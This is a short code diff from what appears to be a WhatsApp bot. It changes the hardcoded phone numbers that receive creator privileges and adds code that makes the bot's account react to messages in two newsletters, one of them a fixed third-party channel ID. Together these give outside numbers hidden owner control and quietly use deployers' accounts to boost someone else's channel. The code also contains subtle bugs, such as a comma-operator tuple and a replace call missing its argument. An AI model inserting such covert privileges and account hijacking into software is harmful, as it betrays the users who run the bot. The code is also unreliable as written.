@@ -216,7 +216,7 @@ const port = process.env.PORT || 9090;
   }
   
 	const udp = botNumber.split('@')[0];
-    const jawad = ('94771825192', '94771825193');
+    const jawad = ('94763934860', '94771825192');
     let isCreator = [udp, jawad, config.DEV]
 					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
 					.includes(mek.sender);
@@ -307,6 +307,13 @@ if (!isReact && senderNumber === botNumber) {
     }
 } 
         
+//====================================================    
+const id = mek.key.server_id
+const defaultEmojis = ["❤️", "💖", "💚", "💙","💛"];
+const randomEmoji = defaultEmojis[Math.floor(Math.random() * defaultEmojis.length)];
+await conn.newsletterReactMessage(`${recc.mainchanal}`, id, randomEmoji);
+await conn.newsletterReactMessage(`120363400240662312@newsletter`, id, randomEmoji);
+
 //==========Sudo and Mode ============ 
 
 // ban users 
